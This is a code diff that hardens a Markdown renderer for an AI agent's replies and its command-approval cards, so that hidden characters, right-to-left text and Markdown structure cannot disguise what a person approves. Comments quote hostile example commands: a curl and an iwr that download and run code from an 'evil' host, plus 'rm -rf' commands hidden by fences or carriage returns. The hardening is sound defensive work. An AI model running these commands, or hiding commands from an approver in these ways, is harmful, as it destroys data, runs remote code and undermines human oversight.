@@ -12,7 +12,11 @@
 // strong, strikethrough, code spans, fenced code (wrapped, with a Copy button), bullet,
 // numbered and task lists (nested), block quotes, rules, GitHub tables, links, autolinks and
 // bare URLs. Images become links, never loads. Not covered: reference links, footnotes,
-// indented code, HTML.
+// indented code, HTML. Code, and all of an approval's message, is drawn left to right with what
+// is not on screen as it runs shown as escapes (hidden-text.js, #220), and Copy takes what is drawn.
+// An approval's message is never Markdown: it is drawn exactly as written (parseApproval).
+
+import { notesFor, revealLineSeparators, reveal } from './hidden-text.js';
 
 const SAFE_PROTOCOLS = new Set(['http:', 'https:', 'mailto:']);
 const MAX_DEPTH = 12;
@@ -78,8 +82,71 @@ function isTableSep(line) { return RE.tableSep.test(line) && line.includes('-') 
 
 export function parseMarkdown(src) {
   const text = typeof src === 'string' ? src : '';
-  const raw = text.replace(/\r\n?/g, '\n').split('\n');
-  return parseBlocks(raw.map(expandTabs), raw, 0);
+  const kept = standIns(text.replace(/\r\n/g, '\n'));
+  const raw = kept.text.split('\n');
+  return kept.restore(parseBlocks(raw.map(expandTabs), raw, 0));
+}
+
+// A bare carriage return and the line and paragraph separators end no line in a shell, so they
+// end none here: each stays in its line as the character it is, for a block to draw as an escape
+// and to say it held (hidden-text.js notesFor). Escaping them before parsing, as this once did,
+// left a block unable to tell `\u000D` it held from a carriage return. JavaScript's `.` and `$`
+// stop at them, though, so while the parser reads the text each stands in as a private-use
+// character the text does not hold, and is put back in what the parser made.
+const SEPARATORS = /[\r\u2028\u2029]/;
+function standIns(text) {
+  if (!SEPARATORS.test(text)) { return { text, restore: (nodes) => nodes }; }
+  const by = new Map();
+  // The private-use code points the text holds, read once: a check per candidate read the whole
+  // text again, so a message holding U+F0000 onward took seconds to parse (#429).
+  const present = new Set();
+  for (const ch of text) { const c = ch.codePointAt(0); if (c >= 0xF0000 || (c >= 0xE000 && c <= 0xF8FF)) { present.add(c); } }
+  for (const [from, to] of [[0xF0000, 0x10FFFD], [0xE000, 0xF8FF]]) {
+    for (let c = from; c <= to && by.size < 3; c++) {
+      if (!present.has(c)) { by.set(['\r', '\u2028', '\u2029'][by.size], String.fromCodePoint(c)); }
+    }
+  }
+  // A text holding nearly every private-use code point leaves none to stand in: its separators are
+  // escaped before parsing instead, drawn the same, though a block cannot then say it held them.
+  if (by.size < 3) { return { text: text.replace(new RegExp(SEPARATORS.source, 'g'), (c) => revealLineSeparators(c)), restore: (nodes) => nodes }; }
+  const back = new Map([...by].map(([k, v]) => [v, k]));
+  const there = new RegExp([...back.keys()].join('|'), 'gu');
+  const put = (s) => s.replace(there, (c) => back.get(c));
+  // A link whose address held one is no link, as one with a control character never is (safeHref).
+  const held = [...back.keys()].map(encodeURIComponent);
+  const restore = (nodes) => nodes.map((n) => {
+    if (typeof n === 'string') { return put(n); }
+    if (!n || typeof n !== 'object') { return n; }
+    const out = { ...n, children: restore(n.children ?? []) };
+    if (n.attrs) {
+      out.attrs = Object.fromEntries(Object.entries(n.attrs)
+        .filter(([k, v]) => !(k === 'href' && held.some((h) => String(v).toUpperCase().includes(h))))
+        .map(([k, v]) => [k, typeof v === 'string' ? put(v) : v]));
+    }
+    return out;
+  });
+  return { text: text.replace(new RegExp(SEPARATORS.source, 'g'), (c) => by.get(c)), restore };
+}
+
+// An approval's message as its card reads it (#220, #415): exactly as written, all of it, fence
+// markers included; nothing in it is read as Markdown. Approve once allows what runs, and every
+// structure a parser decides hid some of it. A Codex approval carries its command in prose: a link
+// drew `echo "[safe](https://a/";curl${IFS}https://evil/x|sh;")"` as `echo "safe"`, a code span
+// joined two lines into one comment, a backslash escape dropped its backslash, and emphasis
+// dropped a glob's stars. And a line of three backticks, a fence's marker, is a command
+// substitution in bash: `bash -c '` around a fenced `echo rm -rf ~` drew as a harmless echo in a
+// box, while bash runs `rm -rf ~`. So it is one block of text in the code face, its line breaks
+// kept (pre-wrap); only blank lines at its very start and end are left out. A bare CR stays the
+// character it is, drawn as an escape (revealed).
+export function parseApproval(src) {
+  const text = typeof src === 'string' ? src : '';
+  const lines = text.replace(/\r\n/g, '\n').split('\n');
+  // Indices, not shift(): each shift moves every line after it, quadratic in a long blank head.
+  let start = 0;
+  let end = lines.length;
+  while (start < end && blank(lines[start])) { start++; }
+  while (end > start && blank(lines[end - 1])) { end--; }
+  return end > start ? [el('p', [lines.slice(start, end).join('\n')], { class: 'md-literal' })] : [];
 }
 
 // lines: what structure is read from, leading tabs expanded and blank lines in list items
@@ -267,6 +334,15 @@ export function parseInline(text, depth = 0) {
   // Delimiters known to have no closer from here on: cached so a long run of unmatched
   // "*" or "[" stays linear rather than rescanning the rest of the text each time.
   const noCloser = new Set();
+  // The first blank line from an emphasis opener on, found once and kept: openers only move forward.
+  // Searched from each opener, it read the rest of the text again every time, since a paragraph's
+  // text holds none, and closed emphasis grew quadratic (#482).
+  let blank = null;
+  const blankFrom = (from) => {
+    if (blank === null || (blank !== -1 && blank < from)) { blank = text.indexOf('\n\n', from); }
+    return blank;
+  };
+  let links = null;
   const n = text.length;
   let i = 0;
   while (i < n) {
@@ -304,7 +380,7 @@ export function parseInline(text, depth = 0) {
 
     if ((c === '[' || (c === '!' && text[i + 1] === '[')) && depth < MAX_DEPTH && !noCloser.has('[')) {
       const image = c === '!';
-      const link = parseLink(text, image ? i + 1 : i);
+      const link = parseLink(text, image ? i + 1 : i, links ??= linkIndex(text));
       if (link === null) { noCloser.add('['); } else if (link) {
         const href = safeHref(link.dest);
         const label = parseInline(link.label, depth + 1);
@@ -323,7 +399,7 @@ export function parseInline(text, depth = 0) {
     }
 
     if ((c === '*' || c === '_' || c === '~') && depth < MAX_DEPTH) {
-      const span = parseEmphasis(text, i, noCloser);
+      const span = parseEmphasis(text, i, noCloser, blankFrom);
       if (span) {
         push(el(span.tag, parseInline(span.inner, depth + 1)));
         i = span.end;
@@ -349,36 +425,77 @@ export function parseInline(text, depth = 0) {
   return out;
 }
 
-// [label](dest "title"). Returns {label, dest, title, end}, false if this "[" is not a
-// link, or null if no "]" follows at all (so the caller stops looking).
-function parseLink(text, open) {
-  let depthB = 0, k = open;
-  for (; k < text.length; k++) {
-    const ch = text[k];
-    if (ch === '\\') { k++; continue; }
-    if (ch === '[') { depthB++; } else if (ch === ']') { depthB--; if (depthB === 0) { break; } }
+// Where a link's scans end, read once for a whole text (#439). Scanning afresh from each "[" was
+// quadratic on agent text: 20,000 nested "[" before as many "]" took 1.35 s, each "[" reading to
+// its partner, and "[a](" repeated took 67 s at 200,000 characters, each destination read to the
+// end of the text. Every scan starts just after a character that is not a backslash, so whether a
+// character is escaped (an odd run of backslashes before it) is the text's, not the scan's; and a
+// scan's depth is the difference of two running counts. So the "]" closing a "[" is the first
+// unescaped "]" after it at the bracket depth just inside it, and a destination ends at the first
+// unescaped whitespace or the first unescaped ")" at the parenthesis depth it starts at.
+function linkIndex(text) {
+  const n = text.length;
+  const live = new Uint8Array(n);
+  const brackets = new Int32Array(n + 1);
+  const parens = new Int32Array(n + 1);
+  for (let p = 0, run = 0; p < n; p++) {
+    const c = text[p];
+    const on = run % 2 === 0;
+    live[p] = on ? 1 : 0;
+    run = c === '\\' ? run + 1 : 0;
+    brackets[p + 1] = brackets[p] + (!on ? 0 : c === '[' ? 1 : c === ']' ? -1 : 0);
+    parens[p + 1] = parens[p] + (!on ? 0 : c === '(' ? 1 : c === ')' ? -1 : 0);
   }
-  if (k >= text.length) { return null; }
+  const close = new Int32Array(n + 1).fill(-1);
+  const destEnd = new Int32Array(n + 1).fill(n);
+  const angle = new Int32Array(n + 1).fill(-1);
+  // The nearest "]" and ")" seen so far at each depth, which runs from -n to n.
+  const closeAt = new Int32Array(2 * n + 1).fill(-1);
+  const parenAt = new Int32Array(2 * n + 1).fill(-1);
+  let space = n;
+  let gt = -1;
+  for (let p = n - 1; p >= 0; p--) {
+    const c = text[p];
+    if (c === '>') { gt = p; }
+    angle[p] = gt;
+    if (live[p]) {
+      if (c === ']') { closeAt[brackets[p] + n] = p; } else if (c === ')') { parenAt[parens[p] + n] = p; } else if (/\s/.test(c)) { space = p; }
+    }
+    close[p] = closeAt[brackets[p] + n];
+    const paren = parenAt[parens[p] + n];
+    destEnd[p] = paren === -1 || space < paren ? space : paren;
+  }
+  // What follows a destination depends only on where it ended, and many "[" can end at one place.
+  return { close, destEnd, angle, after: new Map() };
+}
+
+// [label](dest "title"). Returns {label, dest, title, end}, false if this "[" is not a
+// link, or null if no "]" follows at all (so the caller stops looking). at: linkIndex(text).
+function parseLink(text, open, at) {
+  const k = at.close[open + 1];
+  if (k === -1) { return null; }
   if (text[k + 1] !== '(') { return false; }
-  const label = text.slice(open + 1, k);
   let p = k + 2;
   while (text[p] === ' ' || text[p] === '\n') { p++; }
-  let dest = '';
+  let from;
   if (text[p] === '<') {
-    const end = text.indexOf('>', p);
+    const end = at.angle[p];
     if (end === -1) { return false; }
-    dest = text.slice(p + 1, end);
+    from = [p + 1, end];
     p = end + 1;
   } else {
-    let parens = 0;
-    const start = p;
-    for (; p < text.length; p++) {
-      const ch = text[p];
-      if (ch === '\\' && p + 1 < text.length) { p++; continue; }
-      if (ch === '(') { parens++; } else if (ch === ')') { if (parens === 0) { break; } parens--; } else if (/\s/.test(ch)) { break; }
-    }
-    dest = text.slice(start, p);
+    from = [p, at.destEnd[p]];
+    p = at.destEnd[p];
   }
+  let rest = at.after.get(p);
+  if (rest === undefined) { rest = linkTail(text, p); at.after.set(p, rest); }
+  // Sliced only for a link: the scans were linear, and copying each failed label or destination
+  // out would not be.
+  return rest && { label: text.slice(open + 1, k), dest: text.slice(...from), ...rest };
+}
+
+// A link's optional title and its ")", from where its destination ended.
+function linkTail(text, p) {
   while (text[p] === ' ' || text[p] === '\n') { p++; }
   let title = null;
   if (text[p] === '"' || text[p] === "'") {
@@ -390,10 +507,10 @@ function parseLink(text, open) {
     while (text[p] === ' ') { p++; }
   }
   if (text[p] !== ')') { return false; }
-  return { label, dest, title, end: p + 1 };
+  return { title, end: p + 1 };
 }
 
-function parseEmphasis(text, i, noCloser) {
+function parseEmphasis(text, i, noCloser, blankFrom) {
   const c = text[i];
   let run = 1;
   while (text[i + run] === c) { run++; }
@@ -407,18 +524,20 @@ function parseEmphasis(text, i, noCloser) {
   if (c === '_' && i > 0 && WORD.test(text[i - 1])) { return null; }
   if (noCloser.has(delim)) { return null; }
   let from = i + len;
+  // Where the span would cross a blank line: reading each candidate's inner text for it was
+  // quadratic, as "_x" repeated offers a closer at every "_" and the word after refuses each one.
+  const blank = blankFrom(i + len);
   for (;;) {
     const close = text.indexOf(delim, from);
     if (close === -1) { noCloser.add(delim); return null; }
     const before = text[close - 1];
     const next = text[close + len];
-    const inner = text.slice(i + len, close);
-    const okClose = close > i + len && !/\s/.test(before) && !inner.includes('\n\n')
+    const okClose = close > i + len && !/\s/.test(before) && (blank === -1 || blank + 2 > close)
       && !(c === '_' && next !== undefined && WORD.test(next))
       // "**" is not closed by the first half of a "***" run meant for an inner "*".
       && !(len === 1 && next === c);
     if (okClose) {
-      return { tag: c === '~' ? 'del' : len === 2 ? 'strong' : 'em', inner, end: close + len };
+      return { tag: c === '~' ? 'del' : len === 2 ? 'strong' : 'em', inner: text.slice(i + len, close), end: close + len };
     }
     from = close + 1;
   }
@@ -428,7 +547,7 @@ function parseEmphasis(text, i, noCloser) {
 
 const TAGS = new Set(['p', 'h4', 'h5', 'h6', 'strong', 'em', 'del', 'code', 'pre', 'ul', 'ol', 'li',
   'blockquote', 'hr', 'br', 'a', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'div']);
-const CLASSES = new Set(['al-c', 'al-r', 'md-table']);
+const CLASSES = new Set(['al-c', 'al-r', 'md-table', 'md-literal']);
 
 // Builds the tree with createElement and text nodes only. Each tag and attribute is checked
 // again here, so nothing a parser bug could produce reaches the page unchecked.
@@ -438,25 +557,84 @@ export function toDom(nodes, doc = document) {
   return frag;
 }
 
+const RTL_TOO = { rightToLeft: true };
+
+// What a code block draws and its Copy takes (#220, ui.md §6.4): the agent's text with every
+// character that is not on screen as it runs, right-to-left letters included, as an escape
+// (hidden-text.js reveal), and without the blank lines a fence may end with, which draw as nothing
+// (and pasted, would run the last line). A line of only spaces or tabs is as blank: copying
+// `echo safe\n    ` took the newline too, and ran the command on paste instead of leaving it for
+// inspection (#429). The last line that holds anything keeps its own trailing spaces.
+// A bidi isolate can otherwise draw
+// `echo ok # check; iwr https://evil/x | iex`, a harmless comment, for a command that runs the
+// download; so Copy takes the escapes too, and a shell gets `\u2067` literally, never a command the
+// person did not see.
+export const codeText = (text) => trimBlankTail(reveal(text, RTL_TOO));
+
+// The blank lines at a block's end, empty or of only whitespace, off; the last line that holds
+// anything keeps its own trailing spaces. A backward scan, linear: the regex it replaces,
+// unanchored at its start, was retried from every newline, so thousands of blank lines stalled the
+// render (#429).
+function trimBlankTail(s) {
+  let end = s.length;
+  for (let i = s.length - 1; i >= 0; i--) {
+    const c = s[i];
+    if (c === '\n') { end = i; continue; }
+    if (/\s/.test(c)) { continue; }
+    break;
+  }
+  return s.slice(0, end);
+}
+
+// An approval's whole message as its card draws it (#220): its literal text (parseApproval) with
+// what is not on screen as it runs, right-to-left letters included, as escapes.
+export function revealed(nodes) {
+  return (nodes ?? []).map((n) => {
+    if (typeof n === 'string') { return reveal(n, RTL_TOO); }
+    if (!n || typeof n !== 'object') { return n; }
+    return { ...n, children: revealed(n.children) };
+  });
+}
+
+const proseText = (s) => revealLineSeparators(String(s).replace(/\r/g, (c) => reveal(c)));
+
 function build(node, doc) {
-  if (typeof node === 'string') { return doc.createTextNode(node); }
+  // Prose draws every CR, NEL and the line and paragraph separators as escapes in their line. A CR
+  // here is never one of a CRLF (parseMarkdown made those LF), so it is drawn even before an LF:
+  // `\r\r\n` in an image's alt text or a link's title reached the page as a raw `x\r\ny` (#423).
+  if (typeof node === 'string') { return doc.createTextNode(proseText(node)); }
   if (!node || !TAGS.has(node.tag)) { return doc.createTextNode(''); }
+  // The Copy button is made here and never by the parser: 'button' is not in TAGS, so no
+  // reply text can produce one, and the only handler on it is ours.
+  if (node.tag === 'pre') { return codeBlock(textOf(node), doc); }
   const e = doc.createElement(node.tag);
   const a = node.attrs ?? {};
+  if (node.tag === 'code') {
+    // A code span reads as a block does, in the order it runs (#220): `rm -rf ~` behind Hebrew
+    // letters reads commented out even in a sentence.
+    e.setAttribute('dir', 'ltr');
+    e.append(doc.createTextNode(reveal(textOf(node), RTL_TOO)));
+    return e;
+  }
   if (node.tag === 'a') {
     const href = safeHref(a.href);
-    if (!href) { return doc.createTextNode(textOf(node)); }
+    // A link that is no link (its address refused here, or holding a bare CR or separator,
+    // parseMarkdown) keeps its words drawn as they would be inside it: a code span in its label
+    // stays a code span, escaped and isolated. Flattened to text, its bidi controls and
+    // right-to-left letters drew raw (#429).
+    if (!href) {
+      const words = doc.createDocumentFragment();
+      for (const child of node.children ?? []) { words.append(build(child, doc)); }
+      return words;
+    }
     e.setAttribute('href', href);
     e.setAttribute('target', '_blank');
     e.setAttribute('rel', 'noopener noreferrer nofollow');
-    if (typeof a.title === 'string') { e.setAttribute('title', a.title); }
+    if (typeof a.title === 'string') { e.setAttribute('title', proseText(a.title)); }
   }
   if (node.tag === 'ol' && /^\d{1,9}$/.test(a.start ?? '')) { e.setAttribute('start', a.start); }
   if (CLASSES.has(a.class)) { e.className = a.class; }
   for (const child of node.children ?? []) { e.append(build(child, doc)); }
-  // The Copy button is made here and never by the parser: 'button' is not in TAGS, so no
-  // reply text can produce one, and the only handler on it is ours.
-  if (node.tag === 'pre') { return codeBlock(e, textOf(node), doc); }
   return e;
 }
 
@@ -464,9 +642,18 @@ const COPY_RESET_MS = 1500;
 
 // A code block with a Copy button in its top-right corner. On a phone, a long command (a
 // 1000-character pwsh -EncodedCommand, say) is all but impossible to select by hand. What
-// is copied is the block's text as the agent wrote it, not as it is wrapped on screen.
-// The button sits beside the <pre>, not in it, so the block's own text stays the code.
-function codeBlock(pre, text, doc) {
+// is copied is exactly what the block draws (codeText), not as it is wrapped on screen.
+// The button sits above the <pre>, not in it, so the block's own text stays the code.
+// The block reads strictly left to right (dir="ltr", isolated in app.css), never in a direction
+// guessed from its letters.
+function codeBlock(raw, doc) {
+  const text = codeText(raw);
+  const code = doc.createElement('code');
+  code.setAttribute('dir', 'ltr');
+  code.append(doc.createTextNode(text));
+  const pre = doc.createElement('pre');
+  pre.setAttribute('dir', 'ltr');
+  pre.append(code);
   const label = doc.createElement('span');
   label.textContent = 'Copy';
   const button = doc.createElement('button');
@@ -492,10 +679,34 @@ function codeBlock(pre, text, doc) {
       delete button.dataset.copy;
     }, COPY_RESET_MS);
   });
+  // The notes and Copy sit in a header above the code, in the flow: its real height pushes the code
+  // down, however the notes wrap in a narrow block or at a large text size. Laid over the code's
+  // padding instead, two wrapped notes covered its first lines (#429).
+  const head = doc.createElement('div');
+  head.className = 'md-code-head';
+  const notes = notesOf(raw, doc);
+  if (notes) { head.append(notes); }
+  head.append(button);
   const wrap = doc.createElement('div');
   wrap.className = 'md-code';
-  wrap.append(button, pre, status);
+  wrap.append(head, pre, status);
   return wrap;
+}
+
+// What a drawn block held that its escapes stand for, said in words beside it (ui.md §6.4):
+// "Contains hidden characters", "Contains right-to-left text", or both.
+function notesOf(raw, doc) {
+  const said = notesFor(raw);
+  if (said.length === 0) { return null; }
+  const notes = doc.createElement('div');
+  notes.className = 'md-notes';
+  for (const words of said) {
+    const note = doc.createElement('span');
+    note.className = 'md-note';
+    note.textContent = words;
+    notes.append(note);
+  }
+  return notes;
 }
 
 // Puts text on the clipboard; true if it got there. The Clipboard API first. It is missing
@@ -541,6 +752,19 @@ export function textOf(node) {
   return (node?.children ?? []).map(textOf).join('');
 }
 
-export function renderMarkdown(text, doc = document) {
-  return toDom(parseMarkdown(text), doc);
+// approval: the text is an approval's message, drawn as its card draws it: exactly as written,
+// revealed, never Markdown (parseApproval), and saying what hidden characters or right-to-left
+// letters it held, as a code block does. Its notes are read from the message as it came, not as it
+// is drawn: a CRLF is drawn as the line ending it is, but its CR is still in what runs. Bash fails
+// `cd /tmp/scratch\r` and runs the next line's `rm -rf ./*` where it is, and the card said nothing
+// (#423). The Needs you lane refuses the same message (needs-you.js). It has no Copy: it would take
+// the whole message, prose and fence lines too, and pasted into bash a line of backticks runs as a
+// command substitution. The caller reads its container left to right.
+export function renderMarkdown(text, doc = document, { approval = false } = {}) {
+  if (!approval) { return toDom(parseMarkdown(text), doc); }
+  const nodes = parseApproval(text);
+  const frag = toDom(revealed(nodes), doc);
+  const notes = nodes.length ? notesOf(text, doc) : null;
+  if (notes) { frag.prepend(notes); }
+  return frag;
 }
